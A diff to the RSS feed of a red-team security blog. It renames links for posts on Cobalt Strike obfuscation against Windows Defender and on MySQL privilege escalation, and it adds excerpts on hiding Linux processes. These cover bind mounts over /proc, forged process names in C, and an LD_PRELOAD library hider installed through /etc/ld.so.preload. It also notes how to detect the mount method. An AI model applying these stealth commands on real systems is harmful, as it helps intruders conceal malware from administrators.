@@ -34,16 +34,16 @@ HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree
     </item>
     <item>
       <title>CS X86 payload分析混淆加密</title>
-      <link>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-Cobalt_Strike-x86_payload_%E5%88%86%E6%9E%90%E5%8F%8A%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/index.html</link>
+      <link>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/CS-X86-payload%E5%88%86%E6%9E%90%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/index.html</link>
       <pubDate>Thu, 20 Feb 2020 23:31:00 +0000</pubDate>
-      <guid>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-Cobalt_Strike-x86_payload_%E5%88%86%E6%9E%90%E5%8F%8A%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/index.html</guid>
+      <guid>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/CS-X86-payload%E5%88%86%E6%9E%90%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/index.html</guid>
       <description>&lt;h1 id=&#34;cobalt-strike--bypassing-windows-defender-with-obfuscation&#34;&gt;Cobalt Strike – Bypassing Windows Defender with Obfuscation&lt;/h1&gt;
 &lt;p&gt;
-&lt;a href=&#34;#image-d5501481a4f7958235a48b52c0c5e0d4&#34; class=&#34;lightbox-link&#34;&gt;
-&lt;img src=&#34;https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-Cobalt_Strike-x86_payload_%E5%88%86%E6%9E%90%E5%8F%8A%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/20191217220720.png&#34; alt=&#34;&#34; style=&#34;height: auto; width: auto;&#34; loading=&#34;lazy&#34;&gt;
+&lt;a href=&#34;#image-38b695f6eb652f7490b85be47d0e7186&#34; class=&#34;lightbox-link&#34;&gt;
+&lt;img src=&#34;https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/CS-X86-payload%E5%88%86%E6%9E%90%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/20191217220720.png&#34; alt=&#34;&#34; style=&#34;height: auto; width: auto;&#34; loading=&#34;lazy&#34;&gt;
 &lt;/a&gt;
-&lt;a href=&#34;javascript:history.back();&#34; class=&#34;lightbox&#34; id=&#34;image-d5501481a4f7958235a48b52c0c5e0d4&#34;&gt;
-&lt;img src=&#34;https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-Cobalt_Strike-x86_payload_%E5%88%86%E6%9E%90%E5%8F%8A%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/20191217220720.png&#34; alt=&#34;&#34; class=&#34;lightbox-image&#34; loading=&#34;lazy&#34;&gt;
+&lt;a href=&#34;javascript:history.back();&#34; class=&#34;lightbox&#34; id=&#34;image-38b695f6eb652f7490b85be47d0e7186&#34;&gt;
+&lt;img src=&#34;https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/CS-X86-payload%E5%88%86%E6%9E%90%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/20191217220720.png&#34; alt=&#34;&#34; class=&#34;lightbox-image&#34; loading=&#34;lazy&#34;&gt;
 &lt;/a&gt;
 Cobalt Strike 使用混淆绕WindowsDefender
 原文：http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/  （2018-03)
@@ -53,16 +53,54 @@ Cobalt Strike 使用混淆绕WindowsDefender
 &lt;/blockquote&gt;</description>
     </item>
     <item>
+      <title>linux隐藏进程-目录挂载方式研究</title>
+      <link>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD%E6%96%B9%E5%BC%8F%E7%A0%94%E7%A9%B6/index.html</link>
+      <pubDate>Thu, 20 Feb 2020 23:31:00 +0000</pubDate>
+      <guid>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD%E6%96%B9%E5%BC%8F%E7%A0%94%E7%A9%B6/index.html</guid>
+      <description>分子实验室 https://molecule-labs.com/
+最近在精细应急响应相关内容的时候注意到linux进程隐藏确实会是应急响应中的一个问题，因此这里对目录挂载方式的隐藏进程方式进行了实践和查询的对抗了解。
+创建挂载隐藏进程 方式1 mount /dev/sda1 /proc/xxx 方式2 mount -o bind /empty/dir /porc/xxxx 查询隐藏挂载目录方式进程的办法 linux /proc/66003 文件系统内容通过挂载操作已经为空，无法获取细节
+唯一查看到隐藏进程的办法是通过cat /proc/mounts 查看挂载项中包含/proc/pid</description>
+    </item>
+    <item>
+      <title>linux隐藏进程-进程名伪造</title>
+      <link>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E8%BF%9B%E7%A8%8B%E5%90%8D%E4%BC%AA%E9%80%A0/index.html</link>
+      <pubDate>Thu, 20 Feb 2020 23:31:00 +0000</pubDate>
+      <guid>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E8%BF%9B%E7%A8%8B%E5%90%8D%E4%BC%AA%E9%80%A0/index.html</guid>
+      <description>分子实验室 https://molecule-labs.com/
+背景： 在测试系统命令对linux隐藏进程的有效性测试，记录的相关知识点。
+原理： 在恶意代码中通过设置具有迷惑性的进程名字，以达到躲避管理员检查的目的
+测试环境： ubuntu
+过程： 这里我们参考：linux 修改进程名称的方法伪造进程 https://www.jb51.net/article/70306.htm，排坑时注意添加声明即可。
+#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;#34;./util/setproctitle.c&amp;#34; # --这里需要注意规避报错-- # 原版这里我测试的时候报错，需要加上下面的函数引用 #ifdef _WIN32 #include &amp;lt;Windows.h&amp;gt; #else #include &amp;lt;unistd.h&amp;gt; #endif # --引用完毕-- // extern char **environ; // int main(int argc , char *argv[]) // { // int i; // printf(&amp;#34;argc:%d\n&amp;#34; , argc); // for (i = 0; i &amp;lt; argc; ++i){ // printf(&amp;#34;0x%x\n&amp;#34; , argv[i]); // printf(&amp;#34;argv[%d]:%s\n&amp;#34; , i , argv[i]); // } // printf(&amp;#34;evriron=%x\n&amp;#34; , environ[0]); // return 0; // } int main(int argc, char **argv){ spt_init(argc,argv); setproctitle(&amp;#34;设置进程名为:this is a test&amp;#34;); sleep(1000); return 0; }setproctitle.</description>
+    </item>
+    <item>
+      <title>linux隐藏进程-预加载库或lib劫持</title>
+      <link>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/index.html</link>
+      <pubDate>Thu, 20 Feb 2020 23:31:00 +0000</pubDate>
+      <guid>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/index.html</guid>
+      <description>劫持lib库 原理解析：利用环境变量LD_PRELOAD或者配置ld.so.preload文件使的恶意的动态库先于系统标准库加载，以达到架空系统标准库中相关函数的目的，最终实现对特定进程的隐藏。实现通过劫持lib库隐藏进程
+这里参考：
+https://github.com/gianlucaborello/libprocesshider ，英文教程
+https://www.anquanke.com/post/id/226285
+首先下载环境
+git clone git@github.com:gianlucaborello/libprocesshider.git cd libprocesshider-master自定义过滤函数
+编辑 processhider.c，根据需要过滤的程序名称，修改process_to_filter变量值。这里需要注意下，这里匹配的是程序运行时候显示的名字，如果要使用python运行的话，这里应该填写的是python，python3同理。这里填写evil_script.py那么执行的时候就应该使用./方式执行，这样程序名为evil_script.py才会匹配并过滤。
+...... /* * Every process with this name will be excluded */ static const char* process_to_filter = &amp;#34;evil_script.py&amp;#34;; ......配置环境
+parallels@ubuntu:~/Documents/libprocesshider-master$ make gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl parallels@ubuntu:~/Documents/libprocesshider-master$ sudo mv libprocesshider.so /usr/local/lib/ sudo -i 进入管理员权限 root@ubuntu:/home/parallels/Documents/libprocesshider-master# echo /usr/local/lib/libprocesshider.so &amp;gt;&amp;gt; /etc/ld.so.preload echo /usr/local/lib/libprocesshider.so &amp;gt;&amp;gt; /etc/ld.so.preload cat /etc/ld.so.preload 测试ps是否会访问预加载，发现是加载了。
+strace -f ps 2&amp;gt;&amp;amp;1 |grep ld.so.preload 这里注意需要./执行evil_script.py, 进程名才会被过滤，如果想使用python执行，那么前面****processhider.</description>
+    </item>
+    <item>
       <title>Mysql提权小结</title>
-      <link>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E5%90%8E%E6%B8%97%E9%80%8F_MYSQL%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/index.html</link>
+      <link>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/Mysql%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/index.html</link>
       <pubDate>Mon, 08 Oct 2018 21:21:00 +0000</pubDate>
-      <guid>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E5%90%8E%E6%B8%97%E9%80%8F_MYSQL%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/index.html</guid>
+      <guid>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/Mysql%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/index.html</guid>
       <description>&lt;!-- raw HTML omitted --&gt;
 &lt;p&gt;
-&lt;a href=&#34;#image-fa1356efe33cf792769803306c20757b&#34; class=&#34;lightbox-link&#34;&gt;
+&lt;a href=&#34;#image-7eb1ef98e52fbd8cd9fce3d80731f1ca&#34; class=&#34;lightbox-link&#34;&gt;
 &lt;img src=&#34;http://xtpeeps.cn/wp-content/uploads/2018/03/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20180302133144.png&#34; alt=&#34;&#34; style=&#34;height: auto; width: auto;&#34; loading=&#34;lazy&#34;&gt;
 &lt;/a&gt;
-&lt;a href=&#34;javascript:history.back();&#34; class=&#34;lightbox&#34; id=&#34;image-fa1356efe33cf792769803306c20757b&#34;&gt;
+&lt;a href=&#34;javascript:history.back();&#34; class=&#34;lightbox&#34; id=&#34;image-7eb1ef98e52fbd8cd9fce3d80731f1ca&#34;&gt;
 &lt;img src=&#34;http://xtpeeps.cn/wp-content/uploads/2018/03/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20180302133144.png&#34; alt=&#34;&#34; class=&#34;lightbox-image&#34; loading=&#34;lazy&#34;&gt;
 &lt;/a&gt;&lt;/p&gt;
 &lt;blockquote&gt;
